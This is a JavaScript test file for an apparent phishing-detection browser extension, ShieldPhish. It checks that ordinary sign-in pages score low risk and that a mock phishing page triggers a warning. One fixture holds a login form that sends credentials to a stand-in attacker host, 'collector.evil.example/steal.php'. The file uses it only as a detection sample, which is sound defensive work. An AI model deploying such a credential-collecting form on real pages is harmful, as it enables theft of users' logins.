// Runs content.js inside a simulated page (jsdom) to check whole-page scores.
// Needs the dev dependency: run `npm install` once before `npm test`.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { JSDOM } = require('jsdom');

const root = path.join(__dirname, '..');
const scripts = ['random_forest_model.js', 'url_features.js', 'content.js']
  .map((file) => fs.readFileSync(path.join(root, file), 'utf8'));

function scan(url, html) {
  const dom = new JSDOM(html, { url, runScripts: 'outside-only', pretendToBeVisual: true });
  const { window } = dom;
  // jsdom has no layout engine, so give it the two pieces content.js relies on.
  Object.defineProperty(window.HTMLElement.prototype, 'innerText', {
    get() { return this.textContent; }
  });
  let report = null;
  window.chrome = {
    runtime: {
      sendMessage: (message) => { report = message; },
      onMessage: { addListener: () => {} }
    }
  };
  scripts.forEach((source) => window.eval(source));
  return { report, window };
}

const loginForm = (action = '/session') => `
  <form action="${action}" method="post">
    <input type="email" name="email"><input type="password" name="password">
    <button>Sign in</button>
  </form>`;

test('a normal HTTPS sign-in page stays low risk and shows no warning', () => {
  const { report, window } = scan(
    'https://accounts.google.com/signin',
    `<title>Sign in - Google Accounts</title><body>${loginForm()}</body>`
  );
  assert.equal(report.verdict, 'Low risk', JSON.stringify(report));
  assert.ok(report.score < 45, `score ${report.score}`);
  assert.equal(window.document.getElementById('shieldphish-warning'), null);
});

test('a university portal login stays low risk', () => {
  const { report } = scan(
    'https://portal.unikl.edu.my/login',
    `<title>Student Portal</title><body>${loginForm()}</body>`
  );
  assert.equal(report.verdict, 'Low risk', JSON.stringify(report));
});

test('a login form alone is mentioned but weighs little', () => {
  const { report } = scan('https://shop.example/account', `<body>${loginForm()}</body>`);
  assert.ok(report.reasons.includes('Page has a login or payment form'));
  assert.ok(!report.reasons.includes('Credential collection form detected'));
});

test('a typical phishing page is high risk and shows a ShieldPhish-branded warning', () => {
  const { report, window } = scan(
    'http://secure-login.verify-account.example.com/signin',
    `<title>Verify your account</title>
     <body><p>Urgent action required. Your account has been restricted.</p>
     ${loginForm('https://collector.evil.example/steal.php')}</body>`
  );
  assert.equal(report.verdict, 'High risk', JSON.stringify(report));
  assert.ok(report.reasons.includes('Login form sends your details to a different website'));
  assert.ok(report.reasons.includes('Password field on a page without HTTPS'));

  const warning = window.document.getElementById('shieldphish-warning');
  assert.ok(warning, 'warning overlay should be shown');
  const text = warning.shadowRoot.textContent;
  assert.match(text, /ShieldPhish/);
  assert.doesNotMatch(text, /McAfee/i);
});
